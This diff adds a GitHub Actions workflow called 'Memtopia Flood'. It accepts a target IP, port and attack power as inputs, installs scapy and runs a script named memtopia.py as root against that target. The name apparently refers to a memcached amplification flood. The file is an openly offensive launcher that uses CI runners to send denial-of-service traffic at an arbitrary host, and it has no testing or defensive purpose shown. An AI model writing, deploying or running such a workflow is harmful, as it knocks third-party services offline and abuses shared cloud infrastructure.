@@ -1,0 +1,38 @@
+name: Memtopia Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      choice:
+        description: "Use locally stored data? (Default: y)"
+        required: true
+        default: "y"
+      iptgt:
+        description: "IP Target"
+        required: true
+      portgt:
+        description: "Port Target"
+        required: true
+        default: "80"
+      pawel:
+        description: "Power (Default: 6000)"
+        required: true
+        default: "6000"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.9
+    - name: Install dependencies
+      run: |
+        sudo python -m pip install --upgrade pip
+        sudo pip install scapy
+        if [ -f requirements.txt ]; then sudo pip install -r requirements.txt; fi
+    - name: Starting Flood...
+      run: |
+        sudo python memtopia.py ${{ github.event.inputs.choice }} ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.pawel }}
